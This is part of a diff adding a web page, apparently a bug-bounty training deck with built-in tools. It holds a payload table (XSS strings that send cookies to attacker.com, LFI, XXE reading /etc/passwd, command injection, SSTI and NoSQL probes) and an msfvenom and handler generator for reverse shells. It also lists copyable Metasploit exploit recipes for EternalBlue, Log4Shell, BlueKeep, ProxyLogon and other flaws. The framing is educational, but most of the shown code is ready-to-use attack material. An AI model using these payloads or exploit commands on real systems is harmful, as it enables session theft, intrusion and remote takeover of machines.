+xss:{mysql:"<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",mssql:"<script>location='http://attacker.com/?c='+document.cookie</script>",postgres:"<svg onload=fetch('http://attacker.com/?c='+document.cookie)>",oracle:"<iframe src='javascript:fetch(`http://attacker.com/?c=${document.cookie}`)'>",mongodb:"<script>alert(document.domain)</script>",generic:"<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>"},
+lfi:{mysql:"../../../etc/passwd",mssql:"..\\\\..\\\\..\\\\windows\\\\win.ini",postgres:"../../../etc/passwd",oracle:"../../../etc/passwd",mongodb:"../../../etc/passwd",generic:"....//....//....//etc/passwd"},
+ssti:{mysql:"{{7*7}}",mssql:"{{7*7}}",postgres:"{{7*7}}",oracle:"{{7*7}}",mongodb:"{{7*7}}",generic:"${7*7}"},
+xxe:{mysql:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',mssql:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><foo>&xxe;</foo>',postgres:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',oracle:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',mongodb:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',generic:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'},
+cmd:{mysql:"; cat /etc/passwd",mssql:"& dir C:\\",postgres:"; whoami",oracle:"| id",mongodb:"; ls -la",generic:"; cat /etc/passwd #"},
+nosql:{mysql:"{'$gt': ''}",mssql:"{'$gt': ''}",postgres:"{'$gt': ''}",oracle:"{'$gt': ''}",mongodb:"{'$where': 'this.password.length > 0'}",generic:"{'$ne': null}"}
+};
+result.textContent=payloads[type][db]||payloads[type].generic;
+}
+function generateMsfPayload(){
+const payload=document.getElementById('msf-payload').value;
+const lhost=document.getElementById('msf-lhost').value;
+const lport=document.getElementById('msf-lport').value;
+const format=document.getElementById('msf-format').value;
+const encoder=document.getElementById('msf-encoder').checked;
+const iterations=document.getElementById('msf-iterations').checked;
+const bg=document.getElementById('msf-bg').checked;
+let ext='';const exts={exe:'.exe',elf:'.elf',apk:'.apk',raw:'.bin',php:'.php',py:'.py',ps1:'.ps1',jsp:'.jsp',war:'.war',dll:'.dll'};
+ext=exts[format]||'';
+let cmd=`msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format}`;
+if(encoder){cmd+=' -e x86/shikata_ga_nai';if(iterations){cmd+=' -i 5'}else{cmd+=' -i 1'}}
+cmd+=` -o payload${ext}`;
+if(bg){cmd+=' && msfconsole -q -x "use exploit/multi/handler; set PAYLOAD '+payload+'; set LHOST '+lhost+'; set LPORT '+lport+'; exploit -j"'}
+document.getElementById('msf-result').innerHTML=`<span class="neon-text" style="word-break:break-all">${cmd}</span><button class="btn btn-sm btn-outline" style="margin-left:auto" onclick="navigator.clipboard.writeText('${cmd}');showToast('Copied!')">COPY</button>`;
+}
+function buildHandler(){
+const payload=document.getElementById('handler-payload').value;
+const lhost=document.getElementById('handler-lhost').value;
+const lport=document.getElementById('handler-lport').value;
+const exitOnSession=document.getElementById('handler-exit').checked;
+const bg=document.getElementById('handler-bg').checked;
+let script=`use exploit/multi/handler\nset PAYLOAD ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}`;
+if(exitOnSession){script+='\nset ExitOnSession false'}
+if(bg){script+='\nset AutoRunScript post/windows/manage/migrate\nexploit -j\njobs'}
+else{script+='\nexploit'}
+document.getElementById('handler-result').innerHTML=`<span class="cmd"># Save as handler.rc and run: msfconsole -q -r handler.rc</span><br><br><span class="output" style="white-space:pre-line">${script}</span><br><br><button class="btn btn-sm btn-outline" onclick="navigator.clipboard.writeText('${script.replace(/\n/g,'\\n')}');showToast('Copied!')">COPY SCRIPT</button>`;
+}
+function showMsfExploit(){
+const key=document.getElementById('msf-exploit-search').value;
+const result=document.getElementById('msf-exploit-detail');
+const exploits={
+'ms17-010':{name:'MS17-010 EternalBlue',cve:'CVE-2017-0144',cvss:'9.8',platform:'Windows',module:'exploit/windows/smb/ms17_010_eternalblue',desc:'SMBv1 vulnerability allowing remote code execution on unpatched Windows systems. Used in WannaCry.',cmd:`use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <target_ip>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'auxiliary/scanner/smb/smb_ms17_010'},
+'cve-2024-12356':{name:'BeyondTrust PRA RCE (CVE-2024-12356)',cve:'CVE-2024-12356',cvss:'9.8',platform:'Linux',module:'exploit/linux/http/beyondtrust_pra_rs_unauth_rce',desc:'Argument injection vulnerability in BeyondTrust Privileged Remote Access. Enables unauthenticated RCE via SQLi chaining.',cmd:`use exploit/linux/http/beyondtrust_pra_rs_unauth_rce\nset RHOSTS <target_ip>\nset RPORT 443\nset SSL true\nset LeverageCVE_2024_12356 true\nset PAYLOAD cmd/unix/reverse_bash\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'check'},
+'cve-2025-1094':{name:'BeyondTrust SQLi -> RCE (CVE-2025-1094)',cve:'CVE-2025-1094',cvss:'9.8',platform:'Linux',module:'exploit/linux/http/beyondtrust_pra_rs_unauth_rce',desc:'SQL injection vulnerability in BeyondTrust PRA. Can be chained with CVE-2024-12356 for unauthenticated remote code execution.',cmd:`use exploit/linux/http/beyondtrust_pra_rs_unauth_rce\nset RHOSTS <target_ip>\nset RPORT 443\nset SSL true\nset LeverageCVE_2024_12356 false\nset PAYLOAD cmd/unix/reverse_bash\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'check'},
+'log4shell':{name:'Log4Shell',cve:'CVE-2021-44228',cvss:'10.0',platform:'Multi',module:'exploit/multi/http/vmware_vcenter_log4shell',desc:'JNDI injection in Apache Log4j2. Allows remote code execution via malicious LDAP/RMI servers.',cmd:`use exploit/multi/http/vmware_vcenter_log4shell\nset RHOSTS <target_ip>\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'check'},
+'bluekeep':{name:'BlueKeep',cve:'CVE-2019-0708',cvss:'9.8',platform:'Windows',module:'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',desc:'RDP vulnerability allowing pre-auth remote code execution. Affects Windows 7/Server 2008.',cmd:`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS <target_ip>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nset TARGET 1\nexploit`,check:'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'},
+'citrix':{name:'Citrix ADC RCE',cve:'CVE-2019-19781',cvss:'9.8',platform:'Multi',module:'exploit/linux/http/citrix_adc_memory_leak',desc:'Directory traversal in Citrix ADC/Gateway leading to remote code execution without authentication.',cmd:`use exploit/linux/http/citrix_adc_memory_leak\nset RHOSTS <target_ip>\nset PAYLOAD cmd/unix/reverse_python\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'auxiliary/scanner/http/citrix_directory_traversal'},
+'printnightmare':{name:'PrintNightmare',cve:'CVE-2021-34527',cvss:'8.8',platform:'Windows',module:'exploit/windows/dce_rpc/cve_2021_34527_printnightmare',desc:'Windows Print Spooler vulnerability allowing remote code execution and local privilege escalation.',cmd:`use exploit/windows/dce_rpc/cve_2021_34527_printnightmare\nset RHOSTS <target_ip>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'auxiliary/scanner/smb/smb_ms17_010'},
+'proxylogon':{name:'ProxyLogon',cve:'CVE-2021-26855',cvss:'9.8',platform:'Windows',module:'exploit/windows/http/exchange_proxylogon_rce',desc:'Server-side request forgery in Microsoft Exchange leading to remote code execution.',cmd:`use exploit/windows/http/exchange_proxylogon_rce\nset RHOSTS <target_ip>\nset EMAIL <target_email>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'auxiliary/scanner/http/exchange_proxylogon'},
+'shellshock':{name:'Shellshock',cve:'CVE-2014-6271',cvss:'9.8',platform:'Unix',module:'exploit/multi/http/apache_mod_cgi_bash_env_exec',desc:'Bash vulnerability allowing remote command execution via environment variables.',cmd:`use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS <target_ip>\nset TARGETURI /cgi-bin/vulnerable\nset PAYLOAD linux/x86/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'check'},
+'heartbleed':{name:'Heartbleed',cve:'CVE-2014-0160',cvss:'7.5',platform:'Multi',module:'auxiliary/scanner/ssl/openssl_heartbleed',desc:'OpenSSL information disclosure. Leaks memory including private keys and passwords.',cmd:`use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS <target_ip>\nset RPORT 443\nset VERBOSE true\nrun`,check:'auxiliary/scanner/ssl/openssl_heartbleed'},
+'struts':{name:'Apache Struts RCE',cve:'CVE-2017-5638',cvss:'10.0',platform:'Multi',module:'exploit/multi/http/struts2_content_type_ognl',desc:'OGNL expression injection in Apache Struts2 Content-Type header. Critical remote code execution.',cmd:`use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS <target_ip>\nset RPORT 8080\nset PAYLOAD linux/x86/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'check'},
+'weblogic':{name:'Oracle WebLogic RCE',cve:'CVE-2020-14882',cvss:'9.8',platform:'Multi',module:'exploit/multi/misc/weblogic_deserialize_asyncresponseservice',desc:'Deserialization vulnerability in Oracle WebLogic Server allowing remote code execution.',cmd:`use exploit/multi/misc/weblogic_deserialize_asyncresponseservice\nset RHOSTS <target_ip>\nset RPORT 7001\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\nexploit`,check:'check'}
+};
+if(!key||!exploits[key]){result.innerHTML='<span style="color:#555">// Select an exploit to see full Metasploit usage commands...</span>';return}
+const x=exploits[key];
+let html=`<span class="cmd">=== ${x.name} ===</span><br>`;
+html+=`<span class="warning">CVE: ${x.cve} | CVSS: ${x.cvss} | Platform: ${x.platform}</span><br><br>`;
+html+=`<span class="output"><strong>Module:</strong> <span class="neon-text">${x.module}</span></span><br>`;
+html+=`<span class="output"><strong>Description:</strong> ${x.desc}</span><br><br>`;
+html+=`<span class="cmd">=== USAGE ===</span><br><span class="output" style="white-space:pre-line">${x.cmd}</span><br><br>`;
+html+=`<span class="cmd">=== VERIFICATION ===</span><br><span class="output">run auxiliary: ${x.check}</span><br><br>`;
+html+=`<button class="btn btn-sm btn-primary" onclick="navigator.clipboard.writeText('${x.cmd.replace(/\n/g,'\\n')}');showToast('Copied!')">COPY COMMANDS</button>`;
+result.innerHTML=html;
+}
+function generateReport(){
+const title=document.getElementById('report-title').value||'Untitled Vulnerability';
+const severity=document.getElementById('report-severity').value;
+const cvss=document.getElementById('report-cvss').value;
+const desc=document.getElementById('report-desc').value||'No description provided.';
+const poc=document.getElementById('report-poc').value||'No PoC provided.';
+const impact=document.getElementById('report-impact').value||'No impact assessment provided.';
+const fix=document.getElementById('report-fix').value||'No remediation provided.';
+const colors={critical:'#ff0000',high:'#ff6b00',medium:'#ffbd2e',low:'#27c93f',info:'#00f0ff'};
+const now=new Date().toISOString().split('T')[0];
+document.getElementById('report-preview').innerHTML=`<div style="color:#e0e0e0">
+<div style="border-bottom:2px solid ${colors[severity]};padding-bottom:16px;margin-bottom:20px">
+<div style="font-size:22px;font-weight:900;color:${colors[severity]};margin-bottom:6px">${title}</div>
+<div style="display:flex;gap:12px;font-size:13px;flex-wrap:wrap">
+<span style="background:${colors[severity]}20;color:${colors[severity]};padding:2px 10px;border-radius:12px;border:1px solid ${colors[severity]}40">SEVERITY: ${severity.toUpperCase()}</span>
+<span style="background:#1a1a2e;padding:2px 10px;border-radius:12px;border:1px solid #333">CVSS: ${cvss}</span>
+<span style="background:#1a1a2e;padding:2px 10px;border-radius:12px;border:1px solid #333">Date: ${now}</span>
+</div>
+</div>
+<div style="margin-bottom:20px"><div style="font-size:14px;font-weight:700;color:var(--accent);margin-bottom:8px">&#128203; DESCRIPTION</div><div style="background:#0d0d15;padding:12px;border-radius:8px;line-height:1.6">${desc.replace(/\n/g,'<br>')}</div></div>
+<div style="margin-bottom:20px"><div style="font-size:14px;font-weight:700;color:var(--accent);margin-bottom:8px">&#129514; PROOF OF CONCEPT</div><div style="background:#0d0d15;padding:12px;border-radius:8px;line-height:1.6;font-family:monospace;font-size:12px">${poc.replace(/\n/g,'<br>')}</div></div>
+<div style="margin-bottom:20px"><div style="font-size:14px;font-weight:700;color:var(--accent);margin-bottom:8px">&#128165; IMPACT</div><div style="background:#0d0d15;padding:12px;border-radius:8px;line-height:1.6">${impact.replace(/\n/g,'<br>')}</div></div>
+<div style="margin-bottom:20px"><div style="font-size:14px;font-weight:700;color:var(--accent);margin-bottom:8px">&#128736; REMEDIATION</div><div style="background:#0d0d15;padding:12px;border-radius:8px;line-height:1.6">${fix.replace(/\n/g,'<br>')}</div></div>
+<div style="background:linear-gradient(135deg,rgba(255,59,59,.05),transparent);border-radius:8px;padding:12px;text-align:center;font-size:13px;color:#888">Generated by Bug Bounty Series 2026 Report Builder</div>
+</div>`;
+}
+function calcBounty(){
+const program=document.getElementById('calc-program').value;
+const severity=document.getElementById('calc-severity').value;
+const scope=document.getElementById('calc-scope').value;
+const ranges={
+tech:{critical:[15000,50000],high:[5000,15000],medium:[1000,5000],low:[100,500]},
+enterprise:{critical:[5000,20000],high:[2000,8000],medium:[500,2500],low:[50,300]},
+startup:{critical:[2000,10000],high:[500,3000],medium:[100,1000],low:[0,100]},
+gov:{critical:[25000,100000],high:[10000,50000],medium:[2000,10000],low:[200,1000]}
+};
+let [min,max]=ranges[program][severity];
+if(scope==='all'){min=Math.round(min*1.5);max=Math.round(max*1.5)}
+else if(scope==='few'){min=Math.round(min*0.5);max=Math.round(max*0.5)}
+else if(scope==='admin'){min=Math.round(min*0.3);max=Math.round(max*0.3)}
+document.getElementById('bounty-result').textContent=`$${min.toLocaleString()} - $${max.toLocaleString()}`;
+}
+updateSlide();
+calcBounty();
+</script>
+</body>
+</html>
